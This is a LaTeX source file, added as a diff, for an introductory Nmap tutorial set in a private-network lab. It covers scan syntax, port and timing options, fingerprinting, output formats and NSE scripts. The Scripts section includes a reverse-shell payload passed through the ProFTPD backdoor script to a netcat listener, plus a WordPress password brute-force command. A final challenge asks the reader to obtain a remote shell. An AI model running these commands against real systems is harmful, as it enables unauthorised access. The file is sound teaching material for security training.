@@ -1,0 +1,233 @@
+\documentclass[twocolumn]{article}
+
+\usepackage[top=0.5in, bottom=0.5in, left=0.5in, right=0.5in]{geometry}
+
+\pagenumbering{gobble}
+
+\title{Nmap 101}
+\author{Santiago Gimenez Ocano}
+\date{}
+
+\begin{document}
+\maketitle
+
+\textbf{Disclaimer:} This document is only for education purposes. Before scanning a network, always ask for consent.
+
+\section{Introduction}
+Nmap (``Network Mapper'') is a free an open-source utility for network discovery and security auditing.
+
+Nmap can determine:
+
+\begin{itemize}
+    \item what hosts are available on the network,
+    \item what services those hosts are offering,
+    \item what operating systems they are running,
+    \item what type of pachet filters/firewalls are in use.
+\end{itemize}
+
+Nmap allows us to know how the network really is as opposed to how it should be.
+
+\section{Basic Usage}
+\subsection{Command sintax}
+
+\indent\texttt{\# nmap [Scan Type] [Options] \{targets\}}\\
+
+Targets can be:
+
+\begin{itemize}
+    \item URLs,
+    \item list of IP addresses,
+    \item network addresses in CDIR,
+    \item mix of previous,
+    \item from a file.
+\end{itemize}
+
+\subsection{Examples}
+
+\texttt{\# nmap 192.168.56.16}
+
+This will ping the host, then scan the top-1000 most used TCP ports.
+
+\texttt{\# nmap 192.168.56.0/24}
+
+This will ping and then scan for the top-1000 most used TCP ports, but for the entire subnetwork. Depending on your network, and your user's privileges you will find more or less machines on. This is probably due to the fact that nmap uses different discovery techniques.\\
+
+\texttt{\# nmap 192.168.56.16-19}
+
+This is equal to the previous example. In this case, we use a list of IP addresses.\\
+
+\texttt{\# nmap -iL targets.txt}
+
+This will ping and then scan the top-1000 most used TCP ports, based on the hosts in the list.
+
+\section{Modifying the standard scan}
+
+There are different types of options, the ones related to ports allow us to:
+
+\begin{itemize}
+    \item change the number of top ports to scan,
+    \item specify ports to be scanned,
+    \item show only open ports,
+    \item scan UDP ports.
+\end{itemize}
+
+\subsection{Examples}
+
+\texttt{\# nmap --top-ports 10 192.168.56.16}
+
+This allows us to scan only the top-10 most common ports.\\
+
+\texttt{\# nmap -F 192.168.56.16}
+
+This will scan the top-100 ports. This is called a fast scan.\\
+
+\texttt{\# nmap -p- 192.168.56.16}
+
+This will scann all ports in the target.\\
+
+\texttt{\# nmap -p22,80,443 192.168.56.17}
+
+This allows us to scan only specific ports.\\
+
+\texttt{\# nmap --open -p22,80,443 192.168.56.17}
+
+This allows us to show only the open ports. It will not show filtered ports.\\
+
+\texttt{\# nmap -sU --top-ports 10 192.168.56.16}
+
+This will scan the top-10 most used UDP ports.
+
+\section{Timing}
+
+Nmap automatically controlls the speed of the scan based on network congestion. However, we can overwrite this with \texttt{-T0} (paranoid), \texttt{-T1} (sneaky), \texttt{-T2} (polite), \texttt{-T3} (normal), \texttt{-T4} (aggressive), \texttt{-T5} (insane).
+
+\subsection{Examples}
+
+\texttt{\# nmap -T5 192.168.56.16}
+
+\texttt{\# nmap -T0 192.168.56.16}
+
+In these examples we can compare the time that nmap takes to complete both scans. When scanning a VM, the time difference might be very small.
+
+
+\section{Getting more information from nmap}
+
+The additional information we can get from nmap includes:
+
+\begin{itemize}
+    \item OS fingerprinting,
+    \item service name and version,
+    \item vulnerabilities
+\end{itemize}
+
+\subsection{Examples}
+
+\texttt{\# nmap -O 192.168.56.16}
+
+This will perform OS fingerprinting.\\
+
+\texttt{\# nmap -sV 192.168.56.16}
+
+This will perform service name and version detection.\\
+
+\texttt{\# nmap -sC 192.168.56.16}
+
+This will get additional information from services.\\
+
+\texttt{\# nmap -A 192.168.56.16}
+
+This will perform all the previous examples, plus a traceroute.
+
+\section{Saving the output}
+
+Nmap allows us to save the output in different formats
+
+\texttt{\# nmap [-oN|-oX|-oG] <filename> \{targets\}}
+
+Where:
+
+\begin{itemize}
+    \item \texttt{-oN} is for regular files,
+    \item \texttt{-oX} is for XML files,
+    \item \texttt{-oG} is for greppable files.
+\end{itemize}
+
+\subsection{Examples}
+
+\texttt{\# nmap -oG results.txt 192.168.56.16}
+
+\section{Scripts}
+
+Scripts extends the behavior of nmap. Scripts are run after open ports have been discovered.\\
+
+Scripts allows us to:
+
+\begin{itemize}
+    \item Get additional information (-C),
+    \item find categories of vulnerabilities,
+    \item find specific vulnerabilities.
+\end{itemize}
+
+The \texttt{-C} option runs a set of scripts categorized as default. Some of these scripts are considered intrusive.
+
+To run a script we use:
+
+\texttt{\# nmap --script=<script> [--script-args=<script arguments>] \{target\}}
+
+\subsection{Examples}
+
+\texttt{\# nmap --script=vuln 192.168.56.16}
+
+This will run all the scripts in the category vulnerability against the target. \\
+
+\texttt{\# nmap --script="http-robots*" 192.168.56.16}
+
+This will show the content of the robots.txt file.\\
+
+\texttt{\# nmap -sV --script="ftp-proftpd-backd*" 192.168.56.19}
+
+This will verify if the target is vulnerable to a specific vulnerability.\\
+
+\texttt{\# nmap -sV --script="ftp-proftpd-back*" --script-args="cmd=ls" 192.168.56.19}
+
+This will list the content of a directory. We do this by modifying the arguments of the script.\\
+
+\texttt{\# nmap -sV --script="ftp-proftpd-back*" --script-args="cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>\&1|nc 192.168.56.1 4444 >/tmp/f" 192.168.56.19}
+
+This will generate a remote connection back to the attacker machine. You will need to have a netcat listener at port 4444 in your host machine. In Kali linux, you can use \texttt{nc -lvnp 4444} in a different terminal.\\
+
+\texttt{\# nmap -sV --script="http-wordpress-brute*" --script-args="passdb=./dict.txt"}
+
+This will bruteforce a wordpres login and show matching passwords. You will need to have a dictionary \texttt{dic.txt} with the password you want nmap to try. Kali Linux has plenty of dictionaries in \texttt{/usr/share/seclists/Passwords}
+
+\section{Challenge}
+
+\begin{enumerate}
+    \item Identify the hidden port in 192.168.56.19.
+    \item Identify the name of the service and version in the hidden port.
+    \item Identify if the service is vulnerable to an exploit.
+    \item Obtain a remote shell by changing the script arguments.
+\end{enumerate}
+
+\begin{thebibliography}{9}
+
+    
+\bibitem{site}
+    \texttt{https://nmap.org}
+
+\bibitem{man}
+    \texttt{\# man nmap}
+
+\bibitem{scripts}
+    \texttt{https://nmap.org/nsedoc/index.html}
+
+\bibitem{book1}
+    \texttt{https://nmap.org/book}
+
+\bibitem{book2}
+    Marsh, Nicholas. \textit{Nmap 6 Cookbook: The Fat-Free Guide to Network Scanning}.2015
+
+\end{thebibliography}
+
+\end{document}
+
